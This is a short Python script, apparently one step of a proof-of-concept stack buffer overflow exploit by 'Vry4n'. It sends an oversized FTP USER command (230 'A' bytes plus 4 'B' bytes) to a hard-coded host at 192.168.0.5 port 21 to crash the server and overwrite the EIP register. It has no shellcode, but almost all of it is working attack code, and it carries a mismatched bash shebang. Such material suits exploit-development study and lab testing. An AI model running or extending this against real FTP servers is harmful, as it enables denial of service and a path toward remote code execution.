#!/bin/bash
import socket

# Part 4 of proof of concept by Vry4n
# This script is intended the specific stack crash and 4 more characters to overwrite the EIP

FUZZ = "A" * 230
EIP = "B" * 4

print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.5", 21))
s.recv(1024)
s.send(b"USER " + FUZZ.encode() + EIP.encode() + b"\r\n")
s.close()
